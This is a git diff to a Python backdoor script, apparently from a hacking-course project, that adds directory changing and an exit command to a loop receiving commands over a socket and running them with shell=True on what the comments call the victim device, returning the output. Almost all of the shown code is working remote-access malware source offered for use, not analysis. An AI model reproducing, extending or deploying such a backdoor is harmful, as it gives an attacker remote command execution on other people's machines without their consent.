@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-import socket, subprocess, json
+import socket, subprocess, json, os
 
 class Backdoor:
     # Backdoor class
@@ -25,16 +25,28 @@ class Backdoor:
                 return json.loads(json_data)
             except ValueError:
                 continue
+    
+    def change_working_directory_to(self, path):
+        # Method allows us to change directory
+        os.chdir(path)
+        return f'[+] Changing working directory to {os.path.abspath(path)}'
 
     def execute_system_command(self, command):
         # Method which executing command on victim device
         return subprocess.check_output(command, shell=True).decode()
 
     def run(self):
-        # Method which run everythong - receiving, sendin, executing, etc.
+        # Method which run everythong - receiving, sending, executing, etc.
         while True:
             command = self.reliable_receive()
-            command_result = self.execute_system_command(command)
+            if command[0] == 'exit': # Ending connection and script
+                self.connection.close()
+                exit()
+            elif command[0] == 'cd' and len(command) > 1: # Execute changing working directory command and move us to path stored in command[1]
+                command_result = self.change_working_directory_to(command[1])
+            else:
+                command_result = self.execute_system_command(command)
+            
             self.reliable_send(command_result)
 
 # Example
